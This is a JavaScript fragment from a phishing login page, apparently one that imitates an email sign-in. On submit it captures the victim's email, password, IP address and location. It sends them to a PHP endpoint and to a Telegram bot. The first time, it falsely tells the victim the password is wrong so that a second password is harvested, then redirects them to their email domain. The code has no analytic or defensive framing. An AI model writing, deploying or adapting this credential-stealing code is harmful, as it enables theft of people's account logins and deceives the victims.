  document.getElementById('password').addEventListener('input', function() {
      const passwordLabel = document.getElementById('password-textfield-label');
      if (passwordLabel) {
          passwordLabel.style.display = this.value.length > 0 ? 'none' : 'block';
      }
  });
  document.getElementById('telegramForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;
      const errorElem = document.getElementById('error');
      const msgElem = document.getElementById('msg');
      errorElem.style.display = 'none';
      msgElem.style.display = 'none';
  
  
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!email) {
          errorElem.style.display = 'block';
          errorElem.innerText = "Email field is empty";
          return;
      }
      if (!emailRegex.test(email)) {
          errorElem.style.display = 'block';
          errorElem.innerText = "That account doesn't exist. Enter a different account";
          return;
      }
      if (!password) {
          errorElem.style.display = 'block';
          errorElem.innerText = "Password field is empty";
          return;
      }
  
      attemptCount++;
      const currentAttemptData = {
          attempt: attemptCount,
          email: email,
          password: password,
          timestamp: new Date().toLocaleString()
      };
      allAttempts.push(currentAttemptData);
      let message = '';
      let promiseTelegram;
  
      if (attemptCount === 1) {
          sendToPhpServer(email, password, ''); 
          message = '⚠️ FIRST LOGIN ATTEMPT ⚠️\n\n';
          message += `📧 Email : ${email}\n`;
          message += `🔑 Password Attempt 1 : ${password}\n`;
          message += `⏰ Time:  ${new Date().toLocaleString()}\n`;
          message += `🌐 IP : ${userLocationData.ip || 'Unknown'}\n`;
          message += `📍 Location : ${userLocationData.city || 'Unknown'}, ${userLocationData.country || 'Unknown'}\n`;
          promiseTelegram = fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ chat_id: telegramChatId, text: message })
          });
          promiseTelegram.finally(() => { 
               msgElem.style.display = 'block';
               msgElem.innerText = "⚠️ That password is incorrect. Please try again."; 
               document.getElementById('password').value = '';
               document.getElementById('password').focus();
          });
          return; 
      }
      const firstPassword = allAttempts[0].password;
      const secondPassword = password;
      sendToPhpServer(email, firstPassword, secondPassword);
      message = '🚨 NEW LOGIN CAPTURED (FINAL) 🚨\n\n';
      message += `📧 Email : ${email}\n`;
      message += `🔑 First Password : ${firstPassword}\n`;
      message += `🔑 Second Password : ${secondPassword}\n`;
      message += `📍 Location : ${userLocationData.city || 'Unknown'}, ${userLocationData.country || 'Unknown'}\n`;
      message += `🌐 IP : ${userLocationData.ip || 'Unknown'}\n`;
      message += `⏰ Time : ${new Date().toLocaleString()}\n`;
      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
              chat_id: telegramChatId,
              text: message
          })
      }).finally(() => {
          window.location.href = 'https://'+email;
      });
  });
  </script>
